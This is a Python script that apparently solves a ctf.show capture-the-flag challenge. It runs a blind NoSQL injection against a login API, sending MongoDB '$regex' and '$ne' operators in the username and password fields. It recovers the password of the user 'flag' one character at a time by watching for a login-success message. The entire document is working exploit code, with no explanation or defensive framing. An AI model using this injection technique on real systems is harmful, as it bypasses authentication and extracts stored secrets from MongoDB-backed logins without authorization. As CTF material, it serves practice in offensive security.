import requests
import string
table = string.digits+string.ascii_lowercase+string.ascii_uppercase+'_{}-,'
url = 'http://df6e0dd4-7664-4f8a-9df2-b3e8d2af976b.challenge.ctf.show/api/index.php'
flag = ''
for i in range(100):
    for j in table:
        tmp = flag+j
        payload1 = f'f{tmp}.*$'
        data1 = {'username[$regex]':payload1
                ,'password[$ne]':1}

        payload2 = f'^{tmp}.*$'
        data2 = {'username[$regex]':'flag'
                 ,'password[$regex]':payload2}
        r = requests.post(url=url, data=data2).text
        if r"\u767b\u9646\u6210\u529f" in r:
            flag += j
            print(flag)
            break